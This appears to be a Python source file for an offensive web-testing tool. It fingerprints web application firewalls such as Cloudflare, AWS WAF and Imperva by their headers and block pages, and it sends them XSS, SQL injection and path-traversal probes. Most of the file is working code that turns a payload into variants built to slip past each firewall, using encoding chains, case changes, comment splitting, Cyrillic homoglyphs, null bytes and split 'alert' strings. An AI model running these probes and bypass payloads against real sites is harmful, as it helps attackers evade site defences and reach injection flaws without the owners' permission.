"""
WAF Fingerprinter - ML-based WAF Identification
Identifies Web Application Firewalls and generates bypass strategies
"""

import requests
from typing import List, Dict, Tuple, Optional
import random
import re

try:
    from sklearn.ensemble import RandomForestClassifier
    from sklearn.feature_extraction.text import TfidfVectorizer
    import pickle
    SKLEARN_AVAILABLE = True
except ImportError:
    SKLEARN_AVAILABLE = False
    print("[WARN] Scikit-learn not available. ML classification will be limited.")


class WAFFingerprinter:
    """
    Identifies Web Application Firewalls using ML-based fingerprinting
    Creates custom bypass strategies for detected WAFs
    """
    
    def __init__(self, model_path: Optional[str] = None):
        # Known WAF signatures
        self.waf_signatures = {
            'cloudflare': {
                'headers': ['cf-ray', 'cf-request-id', '__cfduid'],
                'response_patterns': ['cloudflare', 'cf-error'],
                'block_codes': [403, 429, 503],
                'block_patterns': ['attention required', 'ray id']
            },
            'aws_waf': {
                'headers': ['x-amzn-requestid', 'x-amzn-errortype'],
                'response_patterns': ['aws', 'forbidden'],
                'block_codes': [403],
                'block_patterns': ['request blocked']
            },
            'akamai': {
                'headers': ['akamai-origin-hop', 'akamai-cache-status'],
                'response_patterns': ['akamai', 'reference #'],
                'block_codes': [403],
                'block_patterns': ['access denied', 'reference #']
            },
            'imperva': {
                'headers': ['x-iinfo', 'set-cookie: incap_ses'],
                'response_patterns': ['imperva', 'incapsula'],
                'block_codes': [403],
                'block_patterns': ['request unsuccessful', 'incapsula']
            },
            'sucuri': {
                'headers': ['x-sucuri-id', 'x-sucuri-cache'],
                'response_patterns': ['sucuri', 'cloudproxy'],
                'block_codes': [403],
                'block_patterns': ['access denied', 'sucuri']
            },
            'modsecurity': {
                'headers': ['server: mod_security'],
                'response_patterns': ['mod_security', 'not acceptable'],
                'block_codes': [406, 403],
                'block_patterns': ['not acceptable', '406 not acceptable']
            },
            'wordfence': {
                'headers': ['x-powered-by: wordfence'],
                'response_patterns': ['wordfence', 'generated by wordfence'],
                'block_codes': [403, 503],
                'block_patterns': ['wordfence', 'generated by wordfence']
            },
        }
        
        # Bypass strategies for each WAF
        self.bypass_strategies = {
            'cloudflare': [
                'encoding_chain',
                'case_mutation',
                'comment_injection',
                'unicode_variation',
                'polyglot_payload'
            ],
            'aws_waf': [
                'null_byte_injection',
                'double_encoding',
                'fragment_reassembly',
                'parameter_pollution'
            ],
            'akamai': [
                'encoding_variation',
                'whitespace_manipulation',
                'tag_confusion',
                'protocol_manipulation'
            ],
            'imperva': [
                'obfuscation_advanced',
                'encoding_recursive',
                'syntax_variation',
                'homoglyph_substitution'
            ],
            'default': [
                'encoding_chain',
                'case_mutation',
                'comment_injection'
            ]
        }
        
        # ML model for WAF classification
        self.ml_model = None
        self.vectorizer = None
        
        if model_path:
            self.load_model(model_path)
        
        print("[WAF] WAF Fingerprinter initialized")
    
    def fingerprint_waf(self, url: str, test_payloads: Optional[List[str]] = None) -> Dict:
        """
        Fingerprint WAF protecting the target
        
        Args:
            url: Target URL to fingerprint
            test_payloads: Optional payloads to trigger WAF response
        
        Returns:
            WAF detection results with confidence scores
        """
        print(f"[WAF] Fingerprinting WAF for: {url}")
        
        results = {
            'detected_waf': None,
            'confidence': 0.0,
            'signatures_matched': [],
            'bypass_strategies': [],
            'additional_info': {}
        }
        
        # Use default test payloads if none provided
        if test_payloads is None:
            test_payloads = [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                'union select 1,2,3--',
                '../../../etc/passwd',
            ]
        
        # Phase 1: Passive fingerprinting (headers, server response)
        passive_result = self._passive_fingerprint(url)
        
        # Phase 2: Active fingerprinting (test payloads)
        active_result = self._active_fingerprint(url, test_payloads)
        
        # Phase 3: ML-based classification
        if self.ml_model:
            ml_result = self._ml_classify(passive_result, active_result)
        else:
            ml_result = {'waf': None, 'confidence': 0.0}
        
        # Combine results
        all_detections = {}
        
        # Weight passive detections
        for waf, score in passive_result.items():
            all_detections[waf] = score * 0.3
        
        # Weight active detections
        for waf, score in active_result.items():
            all_detections[waf] = all_detections.get(waf, 0) + score * 0.5
        
        # Weight ML prediction
        if ml_result['waf']:
            waf = ml_result['waf']
            all_detections[waf] = all_detections.get(waf, 0) + ml_result['confidence'] * 0.2
        
        # Get best match
        if all_detections:
            best_waf = max(all_detections.items(), key=lambda x: x[1])
            results['detected_waf'] = best_waf[0]
            results['confidence'] = min(best_waf[1], 1.0)
            results['bypass_strategies'] = self.bypass_strategies.get(
                best_waf[0], 
                self.bypass_strategies['default']
            )
            
            print(f"[WAF] WAF detected: {best_waf[0]} (confidence: {results['confidence']:.2f})")
        else:
            print("[WAF] No WAF detected")
        
        return results
    
    def _passive_fingerprint(self, url: str) -> Dict[str, float]:
        """Passive WAF fingerprinting using headers and response"""
        detections = {}
        
        try:
            response = requests.get(url, timeout=10, allow_redirects=False)
            headers = {k.lower(): v.lower() for k, v in response.headers.items()}
            body = response.text.lower()
            
            for waf_name, signature in self.waf_signatures.items():
                score = 0.0
                
                # Check headers
                for header in signature['headers']:
                    header_lower = header.lower()
                    if any(header_lower in h for h in headers.keys()):
                        score += 0.4
                
                # Check response patterns
                for pattern in signature['response_patterns']:
                    if pattern.lower() in body:
                        score += 0.3
                
                if score > 0:
                    detections[waf_name] = min(score, 1.0)
        
        except Exception as e:
            print(f"   [WARN] Passive fingerprinting error: {e}")
        
        return detections
    
    def _active_fingerprint(self, url: str, test_payloads: List[str]) -> Dict[str, float]:
        """Active WAF fingerprinting by testing payloads"""
        detections = {}
        
        for payload in test_payloads:
            try:
                # Test payload
                response = requests.get(
                    url,
                    params={'test': payload},
                    timeout=10,
                    allow_redirects=False
                )
                
                # Analyze blocking response
                for waf_name, signature in self.waf_signatures.items():
                    score = 0.0
                    
                    # Check if blocked with expected status code
                    if response.status_code in signature['block_codes']:
                        score += 0.3
                    
                    # Check block patterns in response
                    body = response.text.lower()
                    for pattern in signature['block_patterns']:
                        if pattern.lower() in body:
                            score += 0.4
                    
                    if score > 0:
                        detections[waf_name] = detections.get(waf_name, 0) + score
                
            except Exception as e:
                continue
        
        # Normalize scores
        if detections:
            max_score = max(detections.values())
            if max_score > 0:
                for waf in detections:
                    detections[waf] = detections[waf] / max_score
        
        return detections
    
    def _ml_classify(self, passive_result: Dict, active_result: Dict) -> Dict:
        """Use ML model to classify WAF"""
        if not self.ml_model or not self.vectorizer:
            return {'waf': None, 'confidence': 0.0}
        
        # Combine features
        feature_text = ' '.join([
            f"passive_{waf}_{score:.2f}" for waf, score in passive_result.items()
        ] + [
            f"active_{waf}_{score:.2f}" for waf, score in active_result.items()
        ])
        
        # Vectorize
        features = self.vectorizer.transform([feature_text])
        
        # Predict
        prediction = self.ml_model.predict(features)[0]
        confidence = max(self.ml_model.predict_proba(features)[0])
        
        return {'waf': prediction, 'confidence': confidence}
    
    def generate_bypass_payloads(self, base_payload: str, waf_type: str) -> List[str]:
        """
        Generate WAF-specific bypass payloads
        
        Args:
            base_payload: Original payload
            waf_type: Detected WAF type
        
        Returns:
            List of bypass payload variations
        """
        strategies = self.bypass_strategies.get(waf_type, self.bypass_strategies['default'])
        
        bypass_payloads = [base_payload]
        
        for strategy in strategies:
            if strategy == 'encoding_chain':
                bypass_payloads.extend(self._encoding_chain(base_payload))
            elif strategy == 'case_mutation':
                bypass_payloads.extend(self._case_mutation(base_payload))
            elif strategy == 'comment_injection':
                bypass_payloads.extend(self._comment_injection(base_payload))
            elif strategy == 'unicode_variation':
                bypass_payloads.extend(self._unicode_variation(base_payload))
            elif strategy == 'null_byte_injection':
                bypass_payloads.extend(self._null_byte_injection(base_payload))
            elif strategy == 'double_encoding':
                bypass_payloads.extend(self._double_encoding(base_payload))
            elif strategy == 'obfuscation_advanced':
                bypass_payloads.extend(self._obfuscation_advanced(base_payload))
        
        return list(set(bypass_payloads))
    
    # Bypass technique implementations
    def _encoding_chain(self, payload: str) -> List[str]:
        """Chain multiple encoding techniques"""
        variants = []
        # URL encode
        url_encoded = ''.join(f'%{ord(c):02x}' for c in payload)
        variants.append(url_encoded)
        # HTML encode
        html_encoded = ''.join(f'&#{ord(c)};' for c in payload)
        variants.append(html_encoded)
        # Double URL encode
        variants.append(''.join(f'%{ord(c):02x}' for c in url_encoded))
        return variants
    
    def _case_mutation(self, payload: str) -> List[str]:
        """Case mutation variants"""
        return [
            payload.swapcase(),
            payload.upper(),
            payload.lower(),
            ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
        ]
    
    def _comment_injection(self, payload: str) -> List[str]:
        """Comment injection variants"""
        return [
            payload.replace('<', '<!--'),
            payload.replace('>', '-->'),
            f'<!--{payload}-->',
            payload.replace('script', 'scr<!-- -->ipt'),
        ]
    
    def _unicode_variation(self, payload: str) -> List[str]:
        """Unicode variation variants"""
        return [
            payload.replace('a', 'а'),  # Cyrillic
            payload.replace('o', 'о'),
            ''.join(f'\\u{ord(c):04x}' if c.isalpha() else c for c in payload),
        ]
    
    def _null_byte_injection(self, payload: str) -> List[str]:
        """Null byte injection variants"""
        return [
            payload.replace('<', '\x00<'),
            payload.replace('>', '>\x00'),
            '\x00' + payload,
        ]
    
    def _double_encoding(self, payload: str) -> List[str]:
        """Double encoding variants"""
        encoded = ''.join(f'%{ord(c):02x}' for c in payload)
        return [''.join(f'%{ord(c):02x}' for c in encoded)]
    
    def _obfuscation_advanced(self, payload: str) -> List[str]:
        """Advanced obfuscation variants"""
        variants = []
        if 'alert' in payload:
            variants.append(payload.replace('alert', 'self["ale"+"rt"]'))
            variants.append(payload.replace('alert', 'window["ale"+"rt"]'))
            variants.append(payload.replace('alert', 'top["ale"+"rt"]'))
        return variants
    
    def save_model(self, path='waf_model.pkl'):
        """Save trained ML model"""
        if not SKLEARN_AVAILABLE or not self.ml_model:
            print("[WARN] No model to save")
            return
        
        with open(path, 'wb') as f:
            pickle.dump({
                'model': self.ml_model,
                'vectorizer': self.vectorizer
            }, f)
        print(f"[WAF] Model saved to {path}")
    
    def load_model(self, path='waf_model.pkl'):
        """Load trained ML model"""
        if not SKLEARN_AVAILABLE:
            print("[WARN] Scikit-learn not available, cannot load model")
            return
        
        try:
            with open(path, 'rb') as f:
                data = pickle.load(f)
                self.ml_model = data['model']
                self.vectorizer = data['vectorizer']
            print(f"[WAF] Model loaded from {path}")
        except Exception as e:
            print(f"[WARN] Could not load model: {e}")


# ==================== USAGE EXAMPLE ====================

if __name__ == "__main__":
    fingerprinter = WAFFingerprinter()
    
    # Fingerprint a target
    result = fingerprinter.fingerprint_waf("https://example.com")
    
    print(f"\n[WAF] Detection Results:")
    print(f"  Detected WAF: {result['detected_waf']}")
    print(f"  Confidence: {result['confidence']:.2f}")
    print(f"  Bypass Strategies: {result['bypass_strategies']}")
    
    # Generate bypass payloads
    if result['detected_waf']:
        bypass_payloads = fingerprinter.generate_bypass_payloads(
            '<script>alert(1)</script>',
            result['detected_waf']
        )
        print(f"\n[WAF] Generated {len(bypass_payloads)} bypass payloads:")
        for i, payload in enumerate(bypass_payloads[:5], 1):
            print(f"  {i}. {payload[:60]}")
